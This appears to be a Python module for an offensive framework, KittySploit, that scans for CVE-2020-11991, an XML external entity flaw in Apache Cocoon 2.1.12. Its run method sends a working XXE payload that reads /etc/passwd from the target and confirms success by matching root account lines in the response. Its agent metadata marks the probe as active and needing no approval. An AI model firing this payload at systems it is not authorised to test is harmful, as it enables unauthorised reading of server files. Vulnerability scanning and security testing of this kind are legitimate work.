#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Apache Cocoon 2."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Apache Cocoon 2.1.12 - XML Injection Detection',
        'description': 'Apache Cocoon 2.1.12 is susceptible to XML injection. When using the StreamGenerator, the code parses a user-provided XML. A specially crafted XML, including external system entities, can be used to access any file on the server system.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'apache', 'xml', 'cocoon', 'xxe', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://lists.apache.org/thread/6xg5j4knfczwdhggo3t95owqzol37k1b',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-11991',
            'https://lists.apache.org/thread.html/r77add973ea521185e1a90aca00ba9dae7caa8d8b944d92421702bb54%40%3Cusers.cocoon.apache.org%3E',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/H4ckTh3W0r1d/Goby_POC',
        ],
        'cve': 'CVE-2020-11991',
    }

    def run(self):
        path = '/v2/api/product/manger/getInfo'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'text/xml'}, data='<!--?xml version="1.0" ?-->\n<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>\n<userInfo>\n<firstName>John</firstName>\n<lastName>&ent;</lastName>\n</userInfo>\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if any(re.search(rx, body) for rx in body_regexes):
            self.set_info(
                severity='high',
                reason='Apache Cocoon 2.1.12 - XML Injection detected',
                path=path,
            )
            return True
        return False

